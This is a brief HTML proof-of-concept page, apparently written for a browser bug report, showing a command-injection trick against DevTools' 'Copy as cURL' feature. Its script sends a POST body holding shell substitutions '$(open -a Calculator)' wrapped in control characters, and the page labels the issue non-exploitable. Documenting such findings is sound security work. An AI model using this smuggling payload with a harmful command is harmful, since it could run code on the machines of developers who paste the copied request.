<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Copy as cURL PoC</title>
</head>
<body>
  <h1>Copy as cURL PoC (iOS / macOS – non exploitable)</h1>
  <button onclick="run()">Send Request</button>

  <script>
    function run() {
      fetch("/copyme", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain"
        },
        body: "test\n$(open -a Calculator)\x0b$(open -a Calculator)\x0c"
      });
      alert("Request sent. Check DevTools Network tab.");
    }
  </script>
</body>
</html>
